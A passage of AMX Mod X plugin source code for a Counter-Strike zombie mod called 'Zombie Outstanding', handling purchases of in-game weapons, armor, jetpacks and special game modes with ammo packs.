					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 4, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					give_item(iPlayer, "weapon_hegrenade");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought a Fire Grenade!");
				}
			}
			case 2:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 25, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					give_item(iPlayer, "weapon_flashbang");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought a Freeze Grenade!");
				}
			}
			case 3:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 9, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					give_item(iPlayer, "weapon_smokegrenade");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought an Explosion Grenade!");
				}
			}
			case 4:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_iRoundType & 4 || g_iRoundType & 8 || g_iRoundType & 128 || g_iRoundType & 256 || g_iRoundType & 512 || g_iRoundType & 1 || g_iRoundType & 2 || g_iRoundType & 32 || g_iRoundType & 64 || g_bRoundEnd || !GetHumans())
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can't buy this item right now!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 4, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					give_item(iPlayer, "weapon_hegrenade");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought an Infection Grenade!");
				}
			}
			case 5:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_iRoundType & 4 || g_iRoundType & 8 || g_iRoundType & 128 || g_iRoundType & 256 || g_iRoundType & 512 || g_iRoundType & 1 || g_iRoundType & 2 || g_iRoundType & 32 || g_iRoundType & 64 || g_bRoundEnd || !GetZombies())
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can't buy this item right now!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 4, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one! [ Use your^3 Fire Grenade^1 before ]");
				}
				else
				{
					g_bKilling[iPlayer] = true;
					give_item(iPlayer, "weapon_hegrenade");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought a Killing Grenade!", g_cName[iPlayer]);
					client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought a^4 Killing Grenade", g_cName[iPlayer]);
				}
			}
			case 6:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 20, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					drop_weapons(iPlayer, 1)
					give_item(iPlayer, "weapon_m249");
					cs_set_user_bpammo(iPlayer, 20, 9999);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought an M249 Machine Gun!");
				}
			}
			case 7:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 24, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					drop_weapons(iPlayer, 1)
					give_item(iPlayer, "weapon_g3sg1");
					cs_set_user_bpammo(iPlayer, 24, 9999);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought a G3SG1 Auto Sniper!");
				}
			}
			case 8:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 13, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					drop_weapons(iPlayer, 1)
					give_item(iPlayer, "weapon_sg550");
					cs_set_user_bpammo(iPlayer, 13, 9999);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought a SG550 Auto Sniper!");
				}
			}
			case 9:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (user_has_weapon(iPlayer, 18, -1))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					drop_weapons(iPlayer, 1)
					give_item(iPlayer, "weapon_awp");
					cs_set_user_bpammo(iPlayer, 18, 9999);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought an AWP Sniper Rifle!");
				}
			}
			case 10:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bFlash[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bFlashEnabled[iPlayer] = true;
					g_bFlash[iPlayer] = true;
					remove_task(iPlayer + 350, 0);
					set_task(0.10, "TaskFlash", iPlayer + 350, "", 0, "b", 0);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought Nightvision Googles!");
				}
			}
			case 11:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bNoDamage[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bNoDamage[iPlayer] = true;
					client_cmd(iPlayer, "spk ZombieOutstanding/zombie_madness");
					fm_set_rendering ( iPlayer, kRenderFxGlowShell, 250, 0 , 0, kRenderNormal, 62  );
					set_task(4.0, "TaskRemoveMadness", iPlayer, "", 0, "", 0);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Zombie Madness!", g_cName[iPlayer]);
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Zombie Madness", g_cName[iPlayer]);
				}
			}
			case 12:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (get_user_jetpack(iPlayer))
				{
					user_drop_jetpack(iPlayer);
				}
				set_user_jetpack(iPlayer, 1);
				set_user_fuel(iPlayer, 250.0);
				client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");
				client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Press^3 CTR+SPACE^1 to fly!");
				client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Press^3 RIGHT CLICK^1 to shoot!");
				g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
				set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
				ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought a Jetpack!", g_cName[iPlayer]);
			}
			case 13:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bUnlimitedClip[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bUnlimitedClip[iPlayer] = 1;
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You bought Unlimited Clip!");
				}
			}
			case 14:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (120 < get_user_armor(iPlayer))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					set_user_armor(iPlayer, get_user_armor(iPlayer) + 100);
					client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You've been equiped with armor (100ap)");
				}
			}
			case 15:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (120 < get_user_armor(iPlayer))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					set_user_armor(iPlayer, get_user_armor(iPlayer) + 200);
					client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "You've been equiped with armor (200ap)");
				}
			}
			case 16:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				g_iMaxJumps[iPlayer]++;
				g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
				set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
				ShowSyncHudMsg(iPlayer, g_iEventsHudmessage, "Now you can do %d jumps in a row!", g_iMaxJumps[iPlayer] + 1);
			}
			case 17:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bTryder[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bTryder[iPlayer] = true;
					strip_user_weapons(iPlayer);
					set_user_armor(iPlayer, 666);
					set_user_health(iPlayer, 666);
					give_item(iPlayer, "weapon_knife");
					give_item(iPlayer, "weapon_deagle");
					give_item(iPlayer, "weapon_xm1014");
					give_item(iPlayer, "weapon_g3sg1");
					give_item(iPlayer, "weapon_ak47");
					give_item(iPlayer, "weapon_hegrenade");
					give_item(iPlayer, "weapon_flashbang");
					give_item(iPlayer, "weapon_smokegrenade");
					cs_set_user_bpammo(iPlayer, 26, 9999);
					cs_set_user_bpammo(iPlayer, 5, 9999);
					cs_set_user_bpammo(iPlayer, 24, 9999);
					cs_set_user_bpammo(iPlayer, 28, 9999);
					g_bUnlimitedClip[iPlayer] = 1;
					fm_set_rendering(iPlayer, kRenderFxGlowShell, 150, 0, 255, kRenderNormal, 10);
					client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");
					set_pev(iPlayer, pev_gravity, 0.5);
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					set_hudmessage(190, 55, 115, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iEventsHudmessage, "%s is now a Tryder!", g_cName[iPlayer]);
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 is now a^4 Tryder", g_cName[iPlayer]);
				}
			}
			case 18:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bGolden[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bGolden[iPlayer] = true;
					if (60 > get_user_armor(iPlayer))
					{
						set_user_armor(iPlayer, 60);
					}
					if (175 > get_user_health(iPlayer))
					{
						set_user_health(iPlayer, 175);
					}
					if (!user_has_weapon(iPlayer, 28, -1))
					{
						give_item(iPlayer, "weapon_ak47");
						cs_set_user_bpammo(iPlayer, 28, 9999);
					}
					g_bUnlimitedClip[iPlayer] = 1;
					client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");					
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					client_cmd(iPlayer, "weapon_ak47");
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iEventsHudmessage, "%s has now a Golden Kalashnikov (AK-47)", g_cName[iPlayer]);
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 has now a^4 Golden Kalashnikov^3 (AK-47)", g_cName[iPlayer]);
				}
			}
			case 19:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_bGoldenDeagle[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have one!");
				}
				else
				{
					g_bGoldenDeagle[iPlayer] = true;
					if (60 > get_user_armor(iPlayer))
					{
						set_user_armor(iPlayer, 60);
					}
					if (175 > get_user_health(iPlayer))
					{
						set_user_health(iPlayer, 175);
					}
					if (!user_has_weapon(iPlayer, 26, -1))
					{
						give_item(iPlayer, "weapon_deagle");
						cs_set_user_bpammo(iPlayer, 26, 9999);
					}
					g_bUnlimitedClip[iPlayer] = 1;
					client_cmd(iPlayer, "spk ZombieOutstanding/armor_equip");
					g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
					client_cmd(iPlayer, "weapon_deagle");
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iEventsHudmessage, "%s has now a Golden Desert Eagle (Night Hawk)", g_cName[iPlayer]);
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 has now a^4 Golden Desert Eagle^3 (Night Hawk)", g_cName[iPlayer]);
				}
			}
			case 20:
			{
				if (g_iSurvivors)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 There already was a survivor this map!");
					return 0;
				}
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				static cTime[3];
				static i;
				static bool:bDone;
				static Float:fGameTime;
				fGameTime = get_gametime();
				bDone = true;
				get_time("%H", cTime, 3);
				i = 0;
				while (i < g_iModeRecordings)
				{
					if (equali(g_cModeRecordings[i], g_cName[iPlayer], 0))
					{
						bDone = false;
					}
					i += 1;
				}
				if (!bDone)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You^3 already bought^1 a game mode this map!");
				}
				else
				{
					if (fGameTime - g_fRoundStartTime < 3.0)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Please wait at least^4 three seconds^1 after the round begining!");
					}
					if (cTime[0] == 48)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can't be^3 Survivor^1 during night...");
					}
					if (g_iRoundsCount > 4 && !g_iRounds[g_iRoundsCount] && !g_iRounds[g_iRoundsCount + -1] && g_bRoundStart)
					{
						g_bRoundStart = false;
						remove_task(550, 0);
						StartSurvivorMode(iPlayer);
						remove_task(700, 0);
						g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
						set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
						ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Survivor!", g_cName[iPlayer]);
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Survivor", g_cName[iPlayer]);
						copy(g_cModeRecordings[g_iModeRecordings], 32, g_cName[iPlayer]);
						g_iModeRecordings += 1;
						g_iSurvivors += 1;
					}
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Sorry but you can't buy right now...");
				}
			}
			case 21:
			{
				if (g_iSnipers)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 There already was a sniper this map!");
					return 0;
				}
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				static cTime[3];
				static i;
				static bool:bDone;
				static Float:fGameTime;
				fGameTime = get_gametime();
				bDone = true;
				get_time("%H", cTime, 3);
				i = 0;
				while (i < g_iModeRecordings)
				{
					if (equali(g_cModeRecordings[i], g_cName[iPlayer], 0))
					{
						bDone = false;
					}
					i += 1;
				}
				if (!bDone)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You^3 already bought^1 a game mode this map!");
				}
				else
				{
					if (fGameTime - g_fRoundStartTime < 3.0)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Please wait at least^4 three seconds^1 after the round begining!");
					}
					if (cTime[0] == 48)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can't be^3 Sniper^1 during night...");
					}
					if (g_iRoundsCount > 4 && !g_iRounds[g_iRoundsCount] && !g_iRounds[g_iRoundsCount + -1] && g_bRoundStart)
					{
						g_bRoundStart = false;
						remove_task(550, 0);
						StartSniperMode(iPlayer);
						remove_task(700, 0);
						g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
						set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
						ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Sniper!", g_cName[iPlayer]);
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Sniper", g_cName[iPlayer]);
						copy(g_cModeRecordings[g_iModeRecordings], 32, g_cName[iPlayer]);
						g_iModeRecordings += 1;
						g_iSnipers += 1;
					}
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Sorry but you can't buy right now...");
				}
			}
			case 22:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				static i;
				static bool:bDone;
				static Float:fGameTime;
				fGameTime = get_gametime();
				bDone = true;
				i = 0;
				while (i < g_iModeRecordings)
				{
					if (equali(g_cModeRecordings[i], g_cName[iPlayer], 0))
					{
						bDone = false;
					}
					i += 1;
				}
				if (!bDone)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You^3 already bought^1 a game mode this map!");
				}
				else
				{
					if (fGameTime - g_fRoundStartTime < 3.0)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Please wait at least^4 three seconds^1 after the round begining!");
					}
					if (g_iRoundsCount > 4 && !g_iRounds[g_iRoundsCount] && !g_iRounds[g_iRoundsCount + -1] && g_bRoundStart)
					{
						g_bRoundStart = false;
						remove_task(550, 0);
						StartNemesisMode(iPlayer);
						remove_task(700, 0);
						g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
						set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
						ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Nemesis!", g_cName[iPlayer]);
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Nemesis", g_cName[iPlayer]);
						copy(g_cModeRecordings[g_iModeRecordings], 32, g_cName[iPlayer]);
						g_iModeRecordings += 1;
					}
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Sorry but you can't buy right now...");
				}
			}
			case 23:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				static i;
				static bool:bDone;
				static Float:fGameTime;
				fGameTime = get_gametime();
				bDone = true;
				i = 0;
				while (i < g_iModeRecordings)
				{
					if (equali(g_cModeRecordings[i], g_cName[iPlayer], 0))
					{
						bDone = false;
					}
					i += 1;
				}
				if (!bDone)
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You^3 already bought^1 a game mode this map!");
				}
				else
				{
					if (fGameTime - g_fRoundStartTime < 3.0)
					{
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Please wait at least^4 three seconds^1 after the round begining!");
					}
